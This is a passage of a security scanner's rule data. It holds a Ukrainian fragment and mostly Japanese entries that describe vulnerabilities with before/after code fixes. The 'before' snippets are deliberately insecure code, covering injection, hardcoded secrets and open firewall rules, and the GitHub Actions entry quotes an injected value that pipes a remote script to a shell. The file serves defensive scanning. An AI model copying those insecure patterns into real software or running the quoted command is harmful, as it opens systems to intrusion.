      title: 'Docker-образ пайплайну GitLab CI не закріплений за конкретною версією',
      description: '"image:" у пайплайні вказує на образ без тега (що відповідає ":latest") або явно на ":latest". Той, хто підтримує цей образ, може замінити його вміст у будь-який момент без зміни репозиторію — той самий пайплайн може одного дня почати виконувати інший код, що є ризиком ланцюга постачання, концептуально ідентичним до GitHub Action, на який посилаються за тегом, а не за комітом.',
      fix: {
        before: `image: node:latest`,
        after: `image: node:20.11.1  # конкретний тег (або ще краще дайджест "node@sha256:...") замість "latest"`,
      },
    },
},
  ja: {
  "supabase-service-role-in-client": {
    title: "Supabaseのシークレットキーがブラウザ向けのファイルに含まれています",
    description:
      "公開プレフィックス(例: NEXT_PUBLIC_、VITE_)が付いた変数、またはクライアント側のファイルがSupabaseのservice role keyを参照しています。このキーはRow Level Securityを回避します。ブラウザのバンドルに含まれると、誰でもそれを読み取ってデータベース管理者として操作できてしまいます。",
    fix: {
      before: `// components/Dashboard.tsx\nconst supabase = createClient(url, process.env.NEXT_PUBLIC_SUPABASE_SERVICE_ROLE_KEY)`,
      after: `// app/api/admin/route.ts (サーバーのみ)\nconst supabase = createClient(url, process.env.SUPABASE_SERVICE_ROLE_KEY)`,
    },
  },
  "hardcoded-secret": {
    title: "コードに直接パスワードや秘密鍵が書かれています",
    description:
      "APIキー、トークン、またはパスワードが、環境変数から読み込まれず、リテラル値として書かれているようです。ソースコード(公開リポジトリならそのリポジトリ)を読んだ人は誰でもその秘密情報を手に入れます。",
    fix: {
      before: `const apiKey = "sk_live_51H8x9K2eZvKYlo2C..."`,
      after: `const apiKey = process.env.STRIPE_SECRET_KEY`,
    },
  },
  "env-file-with-real-values": {
    title: "プロジェクトの実際のパスワードを含むファイルが解析対象に含まれています",
    description:
      ".env.exampleではなく、実際の値が入った.envファイルが解析に含まれています。このファイルがリポジトリや公開デプロイに含まれると、そこに書かれた認証情報がすべて漏洩します。",
    fix: {
      before: `# .env (間違ってコミットされた)\nDATABASE_URL=postgres://user:realpassword@db.host/prod`,
      after: `# .env.example (コミット対象)\nDATABASE_URL=postgres://user:password@localhost/dev\n\n# .envはリポジトリに含めない(.gitignore)`,
    },
  },
  "missing-row-level-security": {
    title: "誰でもすべてのユーザーのデータを読み書きできます",
    description:
      "Row Level Securityが無効になっているか、誰がリクエストしているかを確認せずに誰でもアクセスできるポリシー(USING (true))が設定されています。認証済みのユーザー、あるいは匿名のユーザーでさえ、他の全員のデータを読み書きできます。",
    fix: {
      before: `ALTER TABLE public.orders DISABLE ROW LEVEL SECURITY;`,
      after: `ALTER TABLE public.orders ENABLE ROW LEVEL SECURITY;\nCREATE POLICY "owners only" ON public.orders\n  USING (auth.uid() = user_id);`,
    },
  },
  "sql-injection": {
    title: "ユーザーが入力した値がデータベースクエリに直接貼り付けられています",
    description:
      "SQLクエリが、パラメータを使わず文字列を直接連結または埋め込んで組み立てられています。そのテキストが(間接的にでも)ユーザーから来ている場合、クエリ自体を改変できてしまいます — SQLインジェクション。",
    fix: {
      before: "db.query(`SELECT * FROM users WHERE email = '${email}'`)",
      after: `db.query("SELECT * FROM users WHERE email = $1", [email])`,
    },
  },
  "plaintext-password-storage": {
    title: "パスワードが保護されていないようです",
    description:
      "パスワードのフィールドがリクエストで届いたそのままの形で保存されており、ファイル内にハッシュ関数(bcrypt、argon2、scrypt)が見当たりません。データベースが侵害されると、すべてのパスワードがすぐに使える状態になります。",
    fix: {
      before: `await db.users.insert({ email, password: req.body.password })`,
      after: `const hashed = await bcrypt.hash(req.body.password, 12)\nawait db.users.insert({ email, password: hashed })`,
    },
  },
  "hardcoded-jwt-secret": {
    title: "ログインの署名に使うシークレットがコードに平文で書かれています",
    description:
      "jwt.sign / jwt.verifyに渡されるシークレット(またはJWT_SECRET変数)が、環境変数からではなくコード内のリテラル値になっています。それを読んだ人は誰でも、任意のユーザーの有効なアクセストークンを作成できます。",
    fix: {
      before: `jwt.sign(payload, "super-secret-key-123")`,
      after: `jwt.sign(payload, process.env.JWT_SECRET)`,
    },
  },
  "command-injection": {
    title: "サーバーが外部コマンドの実行を強制される可能性があります",
    description:
      "システムコマンドを実行する関数(exec、execSync、spawn)が、文字列の埋め込みや連結によって組み立てられた文字列を受け取っています。その文字列の一部がユーザー入力に由来する場合、それを制御する者がサーバー上で任意のコマンドを実行できます。",
    fix: {
      before: "execSync(`convert ${filename} output.png`)",
      after: `execFile("convert", [filename, "output.png"])`,
    },
  },
  "path-traversal": {
    title: "サーバー上のファイルが、外部から選択されたパスで読み書きされる可能性があります",
    description:
      "ファイルを読み取り、書き込み、または送信する関数が、許可されたフォルダ内に留まっているかを確認せずに、リクエストの値(query、body、params)からパスを直接取得しています。攻撃者は\"../\"を挿入して想定されたフォルダから抜け出し、サーバー上の任意のファイル(例えば認証情報を含む設定ファイル)を読み書きできます。",
    fix: {
      before: `app.get("/download", (req, res) => {\n  res.sendFile(req.query.file)\n})`,
      after: `const ALLOWED_DIR = path.resolve("./uploads")\napp.get("/download", (req, res) => {\n  const target = path.resolve(ALLOWED_DIR, req.query.file)\n  if (!target.startsWith(ALLOWED_DIR)) return res.status(400).send("許可されていないパスです")\n  res.sendFile(target)\n})`,
    },
  },
  "nosql-injection": {
    title: "ユーザーが入力した値が、MongoDBクエリの中でコードとして実行されます",
    description:
      "MongoDBの$where演算子は、ドキュメントごとにサーバー側でJavaScriptを実行します — その文字列がユーザーから来た値を連結して組み立てられている場合、それを制御する者は、通常のSQLインジェクションのようにフィルタを変えるだけでなく、データベースのコンテキストで任意のコードを実行させることができます。",
    fix: {
      before: `db.collection.find({ $where: "this.username == '" + username + "'" })`,
      after: `db.collection.find({ username: username })`,
    },
  },
  ssti: {
    title: "ユーザーが入力した値が、データとしてではなくテンプレートとして解釈されます",
    description:
      "テンプレートをコンパイル/実行する関数が、固定のテンプレートを使ってデータだけを渡すのではなく、リクエストの値からテンプレート全体を受け取っています。攻撃者はテンプレートエンジンの構文(例えばJinja2の{{7*7}})を直接書き込んでサーバー上でコードを実行できます — Server-Side Template Injectionは、XSSのような表示上の問題にとどまらず、任意のコマンド実行につながることがよくあります。",
    fix: {
      before: `return render_template_string(request.args.get("name"))`,
      after: `return render_template("profile.html", name=request.args.get("name"))`,
    },
  },
  xxe: {
    title: "XMLパーサーがファイルの読み取りや外部へのリクエストを強制される可能性があります",
    description:
      "XMLパーサー(DocumentBuilderFactory)が、近くの行で外部エンティティ(DOCTYPE)を明示的に無効化せずに作成されています。パーサーが信頼できないソースからXMLを受け取る場合、攻撃者は外部エンティティを定義して、サーバー上のファイルを読み取らせたり、任意のアドレスに接続させたりできます — XML External Entity。",
    fix: {
      before: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nDocumentBuilder builder = factory.newDocumentBuilder();`,
      after: `DocumentBuilderFactory factory = DocumentBuilderFactory.newInstance();\nfactory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);\nDocumentBuilder builder = factory.newDocumentBuilder();`,
    },
  },
  "terraform-open-security-group": {
    title: "Terraformのsecurity groupが、機密性の高いポートをインターネット全体に公開しています",
    description:
      '"cidr_blocks"に0.0.0.0/0(任意のIPアドレス)を含むルールが、機密性の高いポート — SSH(22)、RDP(3389)、または典型的なデータベースポート(MySQL、Postgres、MongoDB、Redis、SQL Server) — の近くにあります。インターネット上の誰でも、本来接続すべき人だけでなく、そのサービスへの接続を試みることができます。',
    fix: {
      before: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["0.0.0.0/0"]\n}`,
      after: `ingress {\n  from_port   = 22\n  to_port     = 22\n  protocol    = "tcp"\n  cidr_blocks = ["10.0.0.0/16"]  # あなたのプライベートネットワーク、またはbastion hostのみ\n}`,
    },
  },
  "gcp-firewall-open-to-internet": {
    title: "Google Cloudのファイアウォールルールが、機密性の高いポートをインターネット全体に公開しています",
    description:
      '"source_ranges"に0.0.0.0/0(任意のIPアドレス)を含む"google_compute_firewall"リソースが、機密性の高いポート — SSH(22)、RDP(3389)、または典型的なデータベースポート(MySQL、Postgres、MongoDB、Redis、SQL Server) — へのトラフィックを許可しています。インターネット上の誰でも、本来接続すべき人だけでなく、そのサービスへの接続を試みることができます。',
    fix: {
      before: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["0.0.0.0/0"]\n}`,
      after: `resource "google_compute_firewall" "allow-ssh" {\n  allow {\n    protocol = "tcp"\n    ports    = ["22"]\n  }\n  source_ranges = ["10.0.0.0/16"]  # あなたのプライベートネットワーク、またはbastion hostのみ\n}`,
    },
  },
  "azure-nsg-open-to-internet": {
    title: "Azureのネットワークルールが、機密性の高いポートをインターネット全体に公開しています",
    description:
      '"azurerm_network_security_rule"、または"azurerm_network_security_group"内の"security_rule"ブロックで、"source_address_prefix"が"*"または"0.0.0.0/0"、方向が"Inbound"、アクセスが"Allow"に設定され、機密性の高いポート — SSH(22)、RDP(3389)、または典型的なデータベースポート — の近くにあります。インターネット上の誰でも、本来接続すべき人だけでなく、そのサービスへの接続を試みることができます。',
    fix: {
      before: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "*"\n}`,
      after: `resource "azurerm_network_security_rule" "allow-ssh" {\n  direction              = "Inbound"\n  access                 = "Allow"\n  destination_port_range = "22"\n  source_address_prefix  = "10.0.0.0/16"  # あなたのプライベートネットワーク、またはbastion hostのみ\n}`,
    },
  },
  "terraform-hardcoded-secret": {
    title: "秘密情報が、Terraform変数のデフォルト値として書かれています",
    description:
      '"password"/"secret"/"token"/"key"のような名前の変数が、その"default"にリテラル値を持っています。実行時に渡される値(tfvars、TF_VAR_*環境変数)とは異なり、defaultはソースコードに残ります — リポジトリが共有または公開されている場合、Terraformの状態にアクセスできなくても誰でもそれを見ることができます。',
    fix: {
      before: `variable "db_password" {\n  default = "supersecret123"\n}`,
      after: `variable "db_password" {\n  # defaultは設定しない: .tfvarsファイル(git管理外)またはTF_VAR_db_password環境変数で渡す\n  sensitive = true\n}`,
    },
  },
  "gha-script-injection": {
    title: "外部ユーザーが制御する値が、CIのシェルコマンドに直接入り込みます",
    description:
      'GitHub Actionsワークフローの"run:"コマンドが、pull requestのタイトル、ブランチ名、コメントのテキストなど、外部のforkからも含め、pull requestやコメントを開ける人なら誰でも書き込める値を直接埋め込んでいます。`"; curl malware.sh | sh #`のような値は、そのワークフローで利用可能なすべてのシークレットにアクセスしながら、CIで任意のコマンドを実行してしまいます。',
    fix: {
      before: `- run: echo "\${{ github.event.pull_request.title }}"`,
      after: `- env:\n    PR_TITLE: \${{ github.event.pull_request.title }}\n  run: echo "$PR_TITLE"  # 環境変数として渡す。コマンドに直接埋め込まない`,
    },
  },
  "gha-pull-request-target-checkout": {
    title: "ワークフローが、リポジトリのシークレットにアクセスできる状態で外部のpull requestのコードを実行します",
    description:
      'ワークフローは"pull_request_target"を使っています — これは無関係なforkから開かれたpull requestに対しても、ベースリポジトリの権限とシークレットで実行されます — そして、ベースブランチではなくpull request自体のコード("github.event.pull_request.head")をチェックアウトします。pull requestを開いた人は、事実上、それらのシークレットにアクセスできる状態で自分のコードを実行させることになります。',
    fix: {
      before: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      - uses: actions/checkout@v4\n        with:\n          ref: \${{ github.event.pull_request.head.sha }}`,
      after: `on:\n  pull_request_target:\njobs:\n  build:\n    steps:\n      # PRのコードではなくベースブランチをチェックアウトする — あるいは、より広い\n      # 権限/シークレットが不要なら"pull_request_target"の代わりに\n      # "pull_request"を使う。\n      - uses: actions/checkout@v4`,
    },
  },
  "insecure-deserialization": {
    title: "リクエストデータが、コードを実行できる形式でデシリアライズされています",
    description:
      "pickle(Python)、unserialize()(PHP)、ObjectInputStream(Java)、またはnode-serializeライブラリ(Node)が、リクエストから直接取得した値をデシリアライズしています。JSONとは異なり、これらの形式はデシリアライズそのものの過程でコードを表現・実行できます — 送信される値を制御する者は、サーバー上で任意のコード実行を達成できます。",
    fix: {
      before: `data = pickle.loads(request.data)`,
      after: `import json\ndata = json.loads(request.data)  # JSONはパース時にコードを実行しない(pickleとは異なる)`,
    },
  },
  "jwt-none-algorithm": {
    title: 'コードが、署名のないJWTトークン("none"アルゴリズム)を明示的に受け入れています',
    description:
      'JWTトークンを検証する際に受け入れるアルゴリズムに"none"が含まれています。"none"アルゴリズムのトークンには検証すべき署名が一切ありません。誰でも任意の内容(例えば管理者ロール)でトークンを作成でき、コードはそれを有効なものとして受け入れてしまいます。',
    fix: {
      before: `jwt.verify(token, secret, { algorithms: ["HS256", "none"] })`,
      after: `jwt.verify(token, secret, { algorithms: ["HS256"] })  // 受け入れるアルゴリズムに"none"を含めない`,
    },
  },
  "unprotected-new-table": {
    title: "新しいテーブルが保護なしで作成されているようです",
    description:
      "SQLマイグレーションでテーブルが作成されていますが、同じファイル内でそのテーブルのRow Level Securityが有効化されていません。この状態が続く限り、そのテーブルは誰でも読み書きできる制限なしの状態で生まれます。",
    fix: {
      before: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);`,
      after: `CREATE TABLE public.invoices (\n  id uuid PRIMARY KEY,\n  user_id uuid REFERENCES auth.users\n);\nALTER TABLE public.invoices ENABLE ROW LEVEL SECURITY;`,
    },
  },
  "permissive-cors": {
    title: "サイトが他のどのWebサイトからのリクエストも受け入れています",
    description:
      "CORSヘッダーがすべてのオリジン(*)からのリクエストを受け入れるよう設定されているか、cors()ミドルウェアが制限なしで使われています。どのサードパーティのWebサイトも、既に認証済みのユーザーのブラウザからあなたのAPIを呼び出せます。",
    fix: {
      before: `app.use(cors())`,
      after: `app.use(cors({ origin: ["https://yoursite.com"] }))`,
    },
  },
  "admin-function-missing-auth": {
    title: "管理者権限を持つ関数が、誰が使っているかを確認していません",
    description:
      "名前から管理者向けの操作だとわかるルートや関数に、近くの行に認証チェックやロールチェックが一切ありません。そのURLを知っている人なら誰でも実行できてしまいます。",
    fix: {
      before: `router.post("/admin/delete-user", async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
      after: `router.post("/admin/delete-user", requireAuth, requireRole("admin"), async (req, res) => {\n  await db.users.delete(req.body.id)\n})`,
    },
  },
  ssrf: {
    title: "サイトが外部コードの実行を強制される可能性があります",
    description:
      "送信するHTTPリクエスト(fetch、axios)が、ユーザーのリクエストから来た値を送信先URLとして直接使っています。悪意のあるユーザーは、あなたのサーバーに内部アドレスや任意のアドレスを呼び出させることができます — Server-Side Request Forgery。",
    fix: {
      before: `const data = await fetch(req.query.url)`,
      after: `const ALLOWED = new Set(["https://api.yourservice.com"])\nif (!ALLOWED.has(req.query.url)) throw new Error("許可されていないURLです")\nconst data = await fetch(req.query.url)`,
    },
  },
  "weak-password-hashing": {
    title: "パスワードが、今では簡単に破られる方法で保護されています",
    description:
      "同じ行で、パスワードに関連する値にmd5()やsha1()が適用されています。これらのアルゴリズムは計算が速すぎます。データベースを持つ攻撃者は1秒間に数十億のパスワードを試すことができます。",
    fix: {
      before: `const hashed = crypto.createHash("md5").update(password).digest("hex")`,
      after: `const hashed = await bcrypt.hash(password, 12)`,
    },
  },
  "xss-dangerous-html": {
    title: "ユーザーが書いたテキストがブラウザでコードを実行する可能性があります",
    description:
      "コンテンツが、プレーンテキストとしてではなく、生のHTML(dangerouslySetInnerHTML、v-html、.innerHTML)としてページに挿入されています。そのコンテンツにユーザー入力が含まれる場合、ページを読む人のブラウザで実行されるスクリプトを含められてしまいます。",
    fix: {
      before: `<div dangerouslySetInnerHTML={{ __html: comment.text }} />`,
      after: `<div>{comment.text}</div>\n// もしHTMLが必要な場合: DOMPurify.sanitize(comment.text)`,
    },
  },
  "public-storage-bucket": {
    title: "アップロードされたファイルの保存領域が誰からでも見える状態です",
    description:
      "ストレージバケット(Supabase Storage、S3)がpublicとして設定されています。ユーザーがアップロードしたドキュメント、写真、ファイルが含まれる場合、そのパスを知っている — または推測できる — 誰でも、認証なしでアクセスできます。",
    fix: {
      before: `supabase.storage.createBucket("uploads", { public: true })`,
      after: `supabase.storage.createBucket("uploads", { public: false })\n// 有効期限付きの署名付きURLでファイルを配信する: createSignedUrl(path, 60)`,
    },
  },
  "csrf-state-changing-get": {
    title: "リンク1つでデータの削除や変更が可能です",
    description:
      "GETルートがデータを変更する操作を行っています(パスにdelete/remove/update/editが含まれる)。GETリクエストはリンクを訪問したり、外部サイトから画像を読み込んだりするだけで実行されます — CSRF攻撃の典型的な足がかりです。",
    fix: {
      before: `router.get("/posts/:id/delete", deletePost)`,
      after: `router.post("/posts/:id/delete", requireAuth, csrfProtection, deletePost)`,
    },
  },
  "insecure-token-storage": {
    title: "ブラウザに保存されたログイン情報がうまく保護されていません",
    description:
      "アクセストークンがlocalStorageに保存されています。httpOnlyクッキーとは異なり、ページ上で実行されるどんなスクリプト(XSS経由で注入された悪意のあるものも含む)もそれを読み取り、盗むことができます。",
    fix: {
      before: `localStorage.setItem("authToken", token)`,
      after: `// サーバー側でトークンをhttpOnlyクッキーとして設定する:\nres.cookie("authToken", token, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "open-redirect": {
    title: "サイトが詐欺サイトへのリダイレクトに使われる可能性があります",
    description:
      "サイトが、既知のドメインかどうかを確認せずに、リクエスト(query、body、params)から直接取得したアドレスにユーザーをリダイレクトしています。あなたのサイトを指しているように見えるリンクが、実際にはフィッシングページにつながる可能性があります。",
    fix: {
      before: `res.redirect(req.query.next)`,
      after: `const ALLOWED = new Set(["/dashboard", "/profile"])\nres.redirect(ALLOWED.has(req.query.next) ? req.query.next : "/dashboard")`,
    },
  },
  idor: {
    title: "アドレス内の数字を変えるだけで、他人のデータが見える可能性があります",
    description:
      "データベースクエリが、リクエストしているユーザーに属しているかを近くの行で確認せずに、URLから取得した識別子(req.params.id)を直接使っています。アドレス内のidを変えるだけで、別のユーザーのデータにアクセスできる可能性があります — Insecure Direct Object Reference。",
    fix: {
      before: `const order = await Order.findById(req.params.id)`,
      after: `const order = await Order.findOne({ _id: req.params.id, userId: req.user.id })`,
    },
  },
  "no-login-rate-limit": {
    title: "ログインフォームが連続した試行回数を制限していません",
    description:
      "ログインルートがファイル内で定義されていますが、同じファイル内にレート制限ミドルウェアの形跡がありません。試行回数に制限がないと、攻撃者は速度を落とされることなくパスワードを連続して試す(ブルートフォース)ことができます。",
    fix: {
      before: `router.post("/login", loginHandler)`,
      after: `import rateLimit from "express-rate-limit"\nconst loginLimiter = rateLimit({ windowMs: 15 * 60 * 1000, max: 5 })\nrouter.post("/login", loginLimiter, loginHandler)`,
    },
  },
  "sensitive-data-in-logs": {
    title: "パスワードや機密データがログに記録されています",
    description:
      "console.log(または類似のもの)の呼び出しに、password、token、secret、apiKeyという名前の変数が含まれています。これらのログが外部サービスやファイルに残ると、機密データが必要以上に長く露出したままになります。",
    fix: {
      before: `console.log("login attempt", { email, password })`,
      after: `console.log("login attempt", { email })`,
    },
  },
  "terraform-s3-block-public-access-disabled": {
    title: "Terraformで定義されたS3バケットでBlock Public Accessが無効になっています",
    description:
      '"aws_s3_bucket_public_access_block"の4つの保護(block_public_acls、ignore_public_acls、block_public_policy、restrict_public_buckets)のうち1つ以上がfalseに設定されています。バケットが既に公開されているという意味ではありませんが、将来誤って公開されるのを防ぐセーフティネットが外れている状態です。',
    fix: {
      before: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls = false\n}`,
      after: `resource "aws_s3_bucket_public_access_block" "example" {\n  block_public_acls       = true\n  ignore_public_acls      = true\n  block_public_policy     = true\n  restrict_public_buckets = true\n}`,
    },
  },
  "terraform-iam-wildcard-policy": {
    title: "Terraformで定義されたIAMポリシーがフルアクセスを許可しています",
    description:
      'アクション"*"とリソース"*"を持つstatementは、すべてのAWSサービスとリソースへのフルアクセスを許可します — 既にライブのIAM状態に対して行われているのと同じチェックを、ここではそれが適用される前のコードから直接読み取っています。緊急時用のロールとして意図されている可能性もありますが、確認が必要です。日常的な用途では、本当に必要な権限だけを与えてください。',
    fix: {
      before: `statement {\n  effect    = "Allow"\n  actions   = ["*"]\n  resources = ["*"]\n}`,
      after: `statement {\n  effect    = "Allow"\n  actions   = ["s3:GetObject"]\n  resources = ["arn:aws:s3:::your-bucket/*"]\n}`,
    },
  },
  "gcp-storage-bucket-public": {
    title: "Google Cloud Storageバケットが誰でも読み取れる状態になっています",
    description:
      '"google_storage_bucket_iam_member"または"google_storage_bucket_iam_binding"リソースが、"allUsers"または"allAuthenticatedUsers"にロールを付与しています。前者はGoogleアカウントなしでインターネット上の誰でもバケットを読み取れるようにし、後者はアクセスすべきでない人も含め、何らかのGoogleアカウントを持つ誰でも読み取れるようにします。',
    fix: {
      before: `resource "google_storage_bucket_iam_member" "public" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "allUsers"\n}`,
      after: `resource "google_storage_bucket_iam_member" "example" {\n  bucket = google_storage_bucket.example.name\n  role   = "roles/storage.objectViewer"\n  member = "user:someone@example.com"  # 本当にアクセスすべき人だけにする(allUsers/allAuthenticatedUsersではなく)\n}`,
    },
  },
  "azure-storage-public-access": {
    title: "Azureストレージアカウントでpublic blob accessが有効になっています",
    description:
      '"azurerm_storage_account"で"allow_blob_public_access"がtrueに設定されています。公開されたblob/コンテナのURLを知っている人は誰でも、認証なしでそれを読み取れます。',
    fix: {
      before: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = true\n}`,
      after: `resource "azurerm_storage_account" "example" {\n  allow_blob_public_access = false\n}`,
    },
  },
  "gcp-iam-overly-broad-role": {
    title: "Google Cloud IAMロールがフルアクセス(Owner/Editor)を許可しています",
    description:
      '"google_project_iam_binding"/"google_project_iam_member"(または組織/フォルダレベルの同等のもの)が、プリミティブロールの"roles/owner"または"roles/editor"を割り当てています — プロジェクト内のほぼすべてのサービスへのほぼフルアクセスです。緊急用アカウントとして意図されている可能性もありますが、確認が必要です。日常的な用途では、本当に必要なより具体的な定義済みロールだけを与えてください。',
    fix: {
      before: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/owner"\n  member  = "user:dev@example.com"\n}`,
      after: `resource "google_project_iam_member" "admin" {\n  project = "my-project"\n  role    = "roles/storage.admin"  # 本当に必要な定義済みロールだけにする(roles/ownerではなく)\n  member  = "user:dev@example.com"\n}`,
    },
  },
  "azure-role-assignment-owner": {
    title: "Azureのロール割り当てがフルアクセス(Owner)を許可しています",
    description:
      '"azurerm_role_assignment"が"Owner"ロールを割り当てています — 割り当てられたスコープ全体(サブスクリプション、リソースグループなど)に対する、他のユーザーの権限の制御を含むフルアクセスです。緊急用アカウントとして意図されている可能性もありますが、確認が必要です。日常的な用途では、本当に必要なより具体的なロール(例えば単一のリソースグループに対する"Contributor")だけを与えてください。',
    fix: {
      before: `resource "azurerm_role_assignment" "example" {\n  scope                = data.azurerm_subscription.primary.id\n  role_definition_name = "Owner"\n}`,
      after: `resource "azurerm_role_assignment" "example" {\n  scope                = azurerm_resource_group.example.id\n  role_definition_name = "Contributor"  # 本当に必要なより具体的なロールだけにする(サブスクリプション全体へのOwnerではなく)\n}`,
    },
  },
  "weak-random-token": {
    title: "セキュリティトークンが、暗号学的に安全でない乱数生成器で生成されています",
    description:
      "token/session/reset/otp/csrfのような名前の値が、Math.random()(JS)、random.random()(Python)、またはrand()(PHP)で生成されています — これらはセキュリティ用に設計されておらず、その系列は予測可能です。このように生成されたトークンは推測または再構築される可能性があり、それが存在する目的(例えば誰でも予測できてしまうパスワードリセットリンク)を無効にしてしまいます。",
    fix: {
      before: `const resetToken = Math.random().toString(36).slice(2);`,
      after: `const resetToken = crypto.randomBytes(32).toString("hex"); // crypto。Math.randomではない — 予測不可能`,
    },
  },
  "ldap-injection": {
    title: "LDAPフィルタが、リクエストの値を直接連結して組み立てられています",
    description:
      'LDAPフィルタ(例: "(uid=...)")を組み立てる行が、LDAPの特殊文字を一切エスケープせずに、リクエストから取得した値を直接含んでいます。その値を制御する者は、フィルタのロジックを改変できます — 例えば認証チェックを回避したり、見るべきでないディレクトリデータを読み取ったりできます。',
    fix: {
      before: "const filter = `(uid=${req.body.username})`;\nclient.search(base, { filter });",
      after: "const filter = `(uid=${ldapEscape(req.body.username)})`; // LDAPの特殊文字はフィルタで使う前に必ずエスケープすること\nclient.search(base, { filter });",
    },
  },
  "header-injection": {
    title: "リクエストの値がHTTPレスポンスヘッダーに直接入り込みます",
    description:
      "HTTPレスポンスヘッダーが、改行(CRLF)を含んでいないか確認せずに、リクエスト(query、body、params)から直接取得した値で設定されています。攻撃者は追加のヘッダー、あるいはまったく別のレスポンス全体を挿入できます — response splitting — これによりキャッシュ、クッキー、他のユーザーに表示される内容を操作できる可能性があります。",
    fix: {
      before: `res.setHeader("X-Redirect-Reason", req.query.reason)`,
      after: `const ALLOWED_REASONS = new Set(["expired", "manual"])\nres.setHeader("X-Redirect-Reason", ALLOWED_REASONS.has(req.query.reason) ? req.query.reason : "unknown")`,
    },
  },
  "gha-unpinned-action": {
    title: "CIのサードパーティアクションが、正確なバージョン(コミットSHA)に固定されていません",
    description:
      'ワークフローが、コミットSHAではなくタグやブランチ(例: "@v1"、"@main")で参照されたサードパーティアクションを使っています。それを管理する人 — あるいはそのアカウントを侵害した人 — は、その参照をいつでも別のコミットに移動でき、CIで実行される内容をそのシークレットへのアクセスとともに密かに変更できます。コミットSHAは常にまったく同じコードを指します。',
    fix: {
      before: `uses: some-org/some-action@v1`,
      after: `uses: some-org/some-action@a1b2c3d4e5f6...  # v1。コミットSHAに固定 — バージョンを更新するときはSHAも更新する`,
    },
  },
  "gha-excessive-permissions": {
    title: "ワークフローが、使用する権限だけでなくトークンのすべての権限を自身に付与しています",
    description:
      '"permissions: write-all"は、ワークフローの一部しか使っていなくても、issue、pull request、パッケージ、デプロイメントなど、ワークフローのGITHUB_TOKENにすべてへの書き込みアクセスを付与します。ワークフローのあるステップが侵害された場合(悪意のある依存関係、注入されたスクリプト)、その広い権限は悪用する側ができることを増やします。',
    fix: {
      before: `permissions: write-all`,
      after: `permissions:\n  contents: read\n  pull-requests: write  # ワークフローが実際に使う権限だけ`,
    },
  },
  "insecure-cookie-flags": {
    title: "セッションまたは認証クッキーがSecureとHttpOnlyフラグなしで設定されています",
    description:
      'session/auth/tokenに似た名前のクッキーが、オプションに"httpOnly"と"secure"を含めずに設定されています。httpOnlyがないと、ページ上のJavaScript — XSS経由で注入されたものも含む — がそのクッキーを読み取れます。secureがないと、暗号化されていないHTTP接続でも送信される可能性があります。',
    fix: {
      before: `res.cookie("session", sessionId)`,
      after: `res.cookie("session", sessionId, { httpOnly: true, secure: true, sameSite: "strict" })`,
    },
  },
  "vulnerable-dependency": (original) => ({
    title: original.title.replace("Dipendenza vulnerabile:", "脆弱な依存関係:"),
    description: original.description,
    fix: {
      before: original.fix.before,
      after: original.fix.after.replace(
        "Nessuna versione corretta nota ancora — valuta un pacchetto alternativo o segui gli aggiornamenti del progetto.",
        "まだ修正済みバージョンは判明していません — 代替パッケージの検討か、プロジェクトの更新状況を追ってください。"
      ),
    },
  }),
  "docker-hardcoded-secret": {
    title: "DockerfileのENVまたはARG命令に、秘密情報が直接書かれています",
    description:
      "password/secret/token/keyのような名前の変数が、ENVまたはARG命令にリテラル値を持っています。通常イメージに含まれない.envファイルとは異なり、この値はDockerイメージ自体に焼き込まれます — pullしたりレイヤー履歴を調査したりできる人なら誰でもそれを復元できます。Dockerfileの後のバージョンでその行を削除しても同様です。",
    fix: {
      before: `ENV DB_PASSWORD=supersecret123`,
      after: `ARG DB_PASSWORD\nENV DB_PASSWORD=$DB_PASSWORD\n# 渡し方: docker build --build-arg DB_PASSWORD=*** (あるいは、より良い方法として\n# レイヤー履歴に残らないBuildKitのsecret mountを使う)`,
    },
  },
  "docker-missing-user": {
    title: "Dockerfileでnon-rootユーザーが設定されていません",
    description:
      "Dockerfile内にUSER命令がありません。指定しない場合、コンテナはrootとして実行されます。攻撃者がコンテナ内でコードを実行できた場合(例えば脆弱なライブラリを悪用して)、コンテナ内でrootであることは、ホストへの脱出や周辺システムへのより広い影響を容易にします。",
    fix: {
      before: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nCMD ["node", "server.js"]`,
      after: `FROM node:20-slim\nWORKDIR /app\nCOPY . .\nUSER node\nCMD ["node", "server.js"]`,
    },
  },
  "docker-unpinned-base-image": {
    title: 'Dockerfileのベースイメージが":latest"タグを使っています',
    description:
      '"FROM"命令が、正確なバージョンではなく明示的に":latest"タグを使っています。"latest"は時間とともに変化します。同じビルドを別のタイミングでやり直すと、ベースイメージの異なるバージョンを取得する可能性があります — 再現性のないビルドであり、誰も決めていないのに望まない更新が入り込む可能性があります。',
    fix: {
      before: `FROM node:latest`,
      after: `FROM node:20.11-slim`,
    },
  },
  "docker-add-remote-url": {
    title: "DockerfileがCOPYではなくADDでリモートファイルをダウンロードしています",
    description:
      "http/https URLを持つADD命令が、整合性チェックなしで、かつリポジトリ内でその内容が見えない状態で、ビルド中にインターネットからファイルをダウンロードします。そのURLが将来侵害された場合、ビルドはDockerfileを読んだだけでは誰も気づかないまま任意のコンテンツを取り込んでしまいます。",
    fix: {
      before: `ADD https://example.com/install.sh /tmp/install.sh`,
      after: `RUN curl -fsSL https://example.com/install.sh -o /tmp/install.sh \\\n    && echo "<期待されるハッシュ>  /tmp/install.sh" | sha256sum -c -`,
    },
  },
  "k8s-privileged-container": {
    title: "Kubernetesマニフェストのコンテナがprivilegedとして実行されています",
    description:
